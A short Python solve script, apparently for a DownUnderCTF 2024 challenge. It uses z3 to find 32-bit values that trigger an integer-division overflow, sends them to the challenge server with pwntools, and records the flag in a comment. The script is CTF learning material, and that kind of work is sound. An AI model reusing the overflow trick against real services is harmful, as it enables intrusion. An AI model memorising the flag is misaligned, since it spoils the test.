#!/usr/bin/env python3

from pwn import *
from z3 import *

x = BitVec('x', 32) # local_11c
y = BitVec('y', 32) # local_118

s = Solver()

s.add(x != 0)
s.add(y != 0)
s.add(y != 1)
s.add(x == (x / y))

s.check()
m = s.model()

p = remote("2024.ductf.dev", 30014)

p.sendline(f"{m[x].as_long()} {m[y].as_long()}".encode()) # 2147483648 4294967295

p.interactive() # DUCTF{w0w_y0u_just_br0ke_math!!}
